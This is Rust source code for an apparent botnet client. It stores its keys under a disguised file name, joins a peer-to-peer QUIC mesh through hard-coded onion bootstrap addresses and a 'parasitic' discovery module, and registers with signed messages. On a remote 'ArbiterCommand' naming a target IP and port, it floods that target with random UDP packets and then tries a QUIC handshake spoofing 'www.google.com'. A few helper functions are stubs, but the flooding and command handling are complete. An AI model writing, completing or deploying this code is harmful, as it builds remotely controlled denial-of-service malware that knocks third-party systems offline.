use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time;
use lru::LruCache;
use std::num::NonZeroUsize;
use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
use protocol::quic::PhantomFrame;
use crate::config::crypto::load_or_generate_keys;
use crate::helpers::paths::get_appdata_dir;
use crate::p2p::transport::{QuicPool, make_client_config};
use crate::p2p::dht::{RoutingTable, InsertResult};
use rand::seq::SliceRandom;
use futures::stream::StreamExt;
use quinn::{Endpoint, ServerConfig};

struct MeshState {
    dht: RoutingTable,
    pool: QuicPool,
    seen_messages: LruCache<String, i64>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_pub_hex = identity.pub_hex.clone();

    let (endpoint, _) = make_server_endpoint("0.0.0.0:0".parse()?)?;
    let local_port = endpoint.local_addr()?.port();
    
    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    
    let mut client_endpoint = endpoint.clone();
    client_endpoint.set_default_client_config(make_client_config());

    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        pool: QuicPool::new(client_endpoint),
        seen_messages: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::config::constants::BOOTSTRAP_ONIONS;
    let mut peers: Vec<String> = if let Some(p) = bootstrap_override {
        vec![p]
    } else {
        BOOTSTRAP_ONIONS.iter().map(|s| s.to_string()).collect()
    };
    
    use crate::discovery::parasitic::ParasiticDiscovery;
    let discovery = ParasiticDiscovery::new();
    if let Ok(found_peers) = discovery.edge_role_find_peers().await {
        for peer in found_peers {
            peers.push(peer.to_string());
        }
    }

    for bootstrap_addr in peers.iter() {
        let _ = register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await;
    }
    
    let state_clone = state.clone();
    tokio::spawn(async move {
        while let Some(conn) = endpoint.accept().await {
            let s_inner = state_clone.clone();
            tokio::spawn(async move {
                if let Ok(connection) = conn.await {
                    handle_connection(connection, s_inner).await;
                }
            });
        }
    });

    let state_maint = state.clone();
    let me = my_address.clone();
    tokio::spawn(async move {
        loop {
            let sleep_time = 60 + (rand::random::<u64>() % 20); 
            time::sleep(Duration::from_secs(sleep_time)).await;
            perform_lookup(&state_maint, &me).await;
        }
    });

    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

async fn handle_connection(conn: quinn::Connection, state: Arc<RwLock<MeshState>>) {
    while let Ok(mut stream) = conn.accept_uni().await {
        let s_inner = state.clone();
        tokio::spawn(async move {
            if let Ok(bytes) = stream.read_to_end(1024 * 64).await {
                if let Some(frame) = PhantomFrame::from_bytes(&bytes) {
                    handle_frame(s_inner, frame).await;
                }
            }
        });
    }
}

async fn handle_frame(state: Arc<RwLock<MeshState>>, frame: PhantomFrame) {
    let plaintext = match protocol::crypto::decrypt_payload(&frame.noise_payload) {
        Ok(p) => p,
        Err(_) => return,
    };

    if let Ok(msg_str) = String::from_utf8(plaintext) {
        if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&msg_str) {
            match mesh_msg {
                MeshMsg::Gossip(gossip) => process_gossip_cmd(gossip),
                MeshMsg::Signal(signal) => handle_signal(state, signal).await,
                _ => {}
            }
        }
    }
}

async fn handle_signal(state: Arc<RwLock<MeshState>>, signal: protocol::SignalMsg) {
    use protocol::SignalMsg;
    match signal {
        SignalMsg::ArbiterCommand { target_ip, target_port, fire_delay_ms, burst_duration_ms } => {
            let endpoint = {
                let guard = state.read().await;
                guard.pool.get_endpoint()
            };
            
            tokio::spawn(async move {
                let _ = execute_bursting(endpoint, &target_ip, target_port, fire_delay_ms, burst_duration_ms).await;
            });
        }
        SignalMsg::Ping { timestamp: _ } => {}
        _ => {}
    }
}

async fn execute_bursting(
    endpoint: Endpoint,
    target_ip: &str,
    target_port: u16,
    fire_delay_ms: u64,
    burst_duration_ms: u64,
) -> Result<(), String> {
    use tokio::time::{sleep, Duration};
    use rand::{Rng, SeedableRng};
    use rand::rngs::StdRng;
    
    let target_addr = format!("{}:{}", target_ip, target_port);
    
    sleep(Duration::from_millis(fire_delay_ms)).await;
    
    let burst_socket = tokio::net::UdpSocket::bind("0.0.0.0:0").await
        .map_err(|e| format!("Bind: {}", e))?;
    
    let target_sock_addr: std::net::SocketAddr = target_addr.parse()
        .map_err(|e| format!("Parse: {}", e))?;
    
    let start = std::time::Instant::now();
    let mut rng = StdRng::from_entropy();
    
    while start.elapsed().as_millis() < burst_duration_ms as u128 {
        let size = rng.gen_range(1200..1300);
        let dummy_data: Vec<u8> = (0..size).map(|_| rng.gen()).collect();
        let _ = burst_socket.send_to(&dummy_data, target_sock_addr).await;
        sleep(Duration::from_millis(20)).await;
    }
    
    let connect = endpoint.connect(target_sock_addr, "www.google.com")
        .map_err(|e| format!("Connect: {}", e))?;
    
    connect.await.map(|_| ()).map_err(|e| format!("Handshake: {}", e))
}

fn process_gossip_cmd(_msg: GossipMsg) {}

fn make_server_endpoint(bind_addr: std::net::SocketAddr) -> Result<(Endpoint, Vec<u8>), Box<dyn std::error::Error>> {
    let cert_key = rcgen::generate_simple_self_signed(vec!["localhost".into()])?;
    let cert_der = cert_key.cert.der().to_vec();
    let key_der = cert_key.signing_key.serialize_der();
    
    let cert_chain = vec![rustls::pki_types::CertificateDer::from(cert_der.clone())];
    let priv_key = rustls::pki_types::PrivateKeyDer::Pkcs8(rustls::pki_types::PrivatePkcs8KeyDer::from(key_der));

    let provider = rustls::crypto::ring::default_provider();
    let server_crypto = rustls::ServerConfig::builder_with_provider(provider.into())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(cert_chain, priv_key)?;

    let mut server_config = ServerConfig::with_crypto(Arc::new(
        quinn::crypto::rustls::QuicServerConfig::try_from(server_crypto)?
    ));
    let transport_config = std::sync::Arc::get_mut(&mut server_config.transport).unwrap();
    transport_config.max_concurrent_uni_streams(100_u8.into());
    
    let endpoint = Endpoint::server(server_config, bind_addr)?;
    Ok((endpoint, cert_der))
}

async fn register_node(state: &Arc<RwLock<MeshState>>, bootstrap_addr: &str, my_pub: &str, my_address: &str, signing_key: &ed25519_dalek::SigningKey) -> Result<(), Box<dyn std::error::Error>> {
    let sig_data = format!("Register:{}", my_address);
    use ed25519_dalek::Signer;
    let signature = hex::encode(signing_key.sign(sig_data.as_bytes()).to_bytes());
    
    let reg = Registration {
        pub_key: my_pub.to_string(),
        peer_address: my_address.to_string(),
        signature,
        pow_nonce: 0,
        timestamp: common::time::TimeKeeper::utc_now().timestamp(),
    };
    
    let msg = MeshMsg::Register(reg);
    let msg_bytes = serde_json::to_vec(&msg)?;
    let transport_sig = protocol::crypto::sign_payload(signing_key, &msg_bytes);
    
    let mut guard = state.write().await;
    guard.pool.send_msg(bootstrap_addr, msg_bytes, 1, transport_sig, &[]).await.map_err(|e| e.into())
}

async fn get_public_ip() -> Option<String> { Some("127.0.0.1".to_string()) }
async fn perform_lookup(_: &Arc<RwLock<MeshState>>, _: &str) {}
